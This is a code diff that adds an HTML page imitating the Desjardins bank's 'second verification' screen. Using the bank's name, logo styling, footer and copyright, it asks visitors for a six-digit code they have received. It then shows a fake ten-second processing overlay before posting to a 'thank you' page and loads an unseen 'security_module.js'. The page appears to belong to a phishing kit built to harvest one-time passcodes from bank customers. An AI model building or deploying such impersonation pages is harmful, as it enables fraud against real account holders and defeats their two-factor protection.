@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Desjardins - Seconde V&eacute;rification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: #f4f4f4; margin: 0; color: #333; }
+        .d-header { background: white; padding: 15px 20px; display: flex; align-items: center; border-bottom: 1px solid #ddd; }
+        .d-menu-icon { font-size: 24px; color: #333; margin-right: 20px; cursor: pointer; }
+        .d-logo { display: flex; align-items: center; color: #007a4d; font-weight: bold; font-size: 24px; }
+        .d-logo-icon { margin-right: 8px; font-size: 28px; }
+        
+        .d-container { padding: 25px 15px; max-width: 450px; margin: 0 auto; }
+        .d-card { background: white; padding: 30px 20px; box-shadow: 0 1px 5px rgba(0,0,0,0.1); }
+        
+        .d-title { color: #007a4d; font-size: 32px; font-weight: 500; margin: 0 0 25px 0; }
+        .d-label { display: flex; align-items: center; font-size: 16px; font-weight: bold; margin-bottom: 10px; color: #333; }
+        .d-label-info { margin-left: 8px; font-weight: normal; font-size: 18px; color: #333; }
+        
+        .d-input-wrapper { position: relative; margin-bottom: 15px; }
+        .d-input { width: 100%; border: 1px solid #ccc; padding: 12px; box-sizing: border-box; font-size: 16px; outline: none; }
+        .d-input:focus { border-color: #007a4d; }
+        
+        .d-checkbox-row { display: flex; align-items: center; font-size: 16px; color: #333; margin-bottom: 25px; }
+        .d-checkbox { width: 22px; height: 22px; margin-right: 12px; border: 1px solid #ccc; }
+        .d-link { color: #007a4d; text-decoration: underline; font-size: 15px; }
+        
+        .d-eye { position: absolute; right: 12px; top: 12px; color: #555; font-size: 18px; }
+        .d-note { font-size: 13px; color: #555; margin-bottom: 25px; margin-top: -5px; display: block; }
+        
+        .d-btn { width: 100%; background: #007a4d; color: white; border: none; padding: 16px; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; margin-bottom: 25px; }
+        .d-btn:hover { background: #005a39; }
+        
+        .d-bottom-links { display: flex; flex-direction: column; gap: 10px; margin-bottom: 25px; }
+        .d-bottom-links a { color: #007a4d; text-decoration: underline; font-size: 16px; }
+        
+        .d-divider { border: 0; border-top: 1px solid #ccc; margin: 25px 0; }
+        
+        .d-security-section { display: flex; justify-content: space-between; }
+        .d-sec-links { display: flex; flex-direction: column; gap: 10px; }
+        .d-sec-links a { color: #6b4c9a; text-decoration: underline; font-size: 15px; }
+        .d-sec-badge { display: flex; align-items: center; color: #6b4c9a; font-size: 15px; }
+        .d-sec-badge i { color: #007a4d; font-size: 24px; margin-right: 10px; }
+        
+        .d-footer { background: #262626; color: white; padding: 30px 20px; text-align: center; font-size: 12px; }
+        .d-footer-nav { display: flex; justify-content: center; flex-wrap: wrap; gap: 10px; font-weight: bold; margin-bottom: 20px; letter-spacing: 0.5px; }
+        .d-footer-nav span { color: #ccc; }
+        .d-footer-legal { display: flex; justify-content: center; flex-wrap: wrap; gap: 8px; color: #aaa; margin-bottom: 10px; }
+        .d-footer-legal span { color: #666; }
+        
+        /* Loader Overlay */
+        .loader-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
+        }
+        .loader-overlay.active { visibility: visible; opacity: 1; }
+        .loader-spinner {
+            border: 4px solid #f3f3f3; border-top: 4px solid #007a4d;
+            border-radius: 50%; width: 50px; height: 50px;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
+        .success-icon { font-size: 70px; color: #007a4d; margin: 20px auto; display: block; text-align: center; }
+        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 40px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="d-header">
+        <i class="fa-solid fa-bars d-menu-icon"></i>
+        <div class="d-logo">
+            <svg class="d-logo-icon" viewBox="0 0 24 24" width="28" height="28">
+                <polygon points="12,2 22,7.5 22,16.5 12,22 2,16.5 2,7.5" fill="none" stroke="#007a4d" stroke-width="2.5" stroke-linejoin="round"></polygon>
+            </svg>
+            Desjardins
+        </div>
+    </div>
+    
+    <div class="d-container">
+        <div class="d-card">
+            <h1 class="d-title">Seconde V&eacute;rification</h1>
+            
+            <p style="margin-bottom: 25px; font-size: 16px; color: #444;">Pour finaliser la v&eacute;rification, veuillez entrer le nouveau code que vous avez re&ccedil;u.</p>
+            <form action="desjardins101_thankyou.html" method="POST">
+                <div class="d-label">Code de v&eacute;rification</div>
+                <div class="d-input-wrapper">
+                    <input type="text" class="d-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px;">
+                </div>
+                
+                <button type="submit" class="d-btn">Valider</button>
+            </form>
+
+        </div>
+    </div>
+    
+    <div class="d-footer">
+        <div class="d-footer-nav">
+            SERVICES AUX PARTICULIERS <span>|</span> SERVICES AUX ENTREPRISES <span>|</span> CONSEILS <span>|</span> &Agrave; PROPOS <span>|</span> APPLICATION MOBILE
+        </div>
+        <div class="d-footer-legal">
+            S&eacute;curit&eacute; <span>|</span> Conditions d'utilisation et notes l&eacute;gales <span>|</span> Confidentialit&eacute;
+        </div>
+        <div class="d-footer-legal">
+            Personnaliser les t&eacute;moins <span>|</span> Accessibilit&eacute; <span>|</span> Plan du site
+        </div>
+        <div style="color: #888; margin-top: 15px;">
+            &copy; 1996-2026, Mouvement des caisses Desjardins. Tous droits r&eacute;serv&eacute;s.
+        </div>
+    </div>
+
+    <!-- Loader Overlay -->
+    <div id="loaderOverlay" class="loader-overlay">
+        <div class="loader-spinner"></div>
+        <p class="loader-text">Traitement en cours, veuillez patienter...</p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('form');
+            const loader = document.getElementById('loaderOverlay');
+            if(form && loader) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    loader.classList.add('active');
+                    setTimeout(function() { form.submit(); }, 10000);
+                });
+            }
+        });
+    </script>
+<script src="security_module.js"></script>
+</body>
+</html>
